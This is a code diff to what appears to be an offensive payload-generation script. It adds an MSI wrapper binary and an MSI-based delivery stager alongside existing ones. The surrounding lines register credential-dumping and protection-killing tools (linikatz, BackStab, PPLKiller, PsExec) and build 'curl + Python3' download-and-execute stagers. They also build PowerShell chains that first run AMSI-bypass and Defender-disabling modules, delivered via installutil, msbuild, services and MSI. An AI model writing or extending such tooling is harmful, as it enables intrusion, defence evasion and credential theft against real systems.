@@ -484,6 +484,7 @@ simple('thirdparty_libs/SysinternalsSuite_PsExec.exe', 'PsExec.exe')
 simple('thirdparty_libs/linikatz.sh')
 simple('thirdparty_libs/BackStab.exe')
 simple('thirdparty_libs/PPLKiller.exe')
+simple('thirdparty_libs/MsiWrapperBatch.exe')
 
 pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
@@ -510,12 +511,15 @@ if netclr == 'v4.0' and _os == 'windows':
     for module in ['noAmsi', 'cleanDef']:
         _command += wlmgr.getCmd(desc2=module) + ';'
     command = _command + wlmgr.getCmd(desc2='ps-1')
-    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='go.ps1') # TODO: amsi might need invoke first in stageless mode
+    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='go.ps1', desc='go.ps1') # TODO: amsi might need invoke first in stageless mode
     pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, pscmdType='enc', FILENAME='go.ps1')
     pandora('service-1', Tvar=dict(psraw=command), useTransform=False, FILENAME='svc.ps1')
     pandora('service-2', useTransform=False, FILENAME='svc_.ps1')
     pandora('msbuild-1', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='gm.ps1') # TODO: amsi might need invoke first in stageless mode
     pandora('psexec-1', useTransform=False)
+    command = _command + wlmgr.getCmd(desc2='go.ps1')
+    pandora('msi-1', Tvar=dict(msiwrapper_dl=wlmgr.getCmd(desc1='[Simple] MsiWrapperBatch.exe'), 
+        psraw=command.replace('"', '`"')), useTransform=False, FILENAME='msi')
 
 
 if args.ps1:
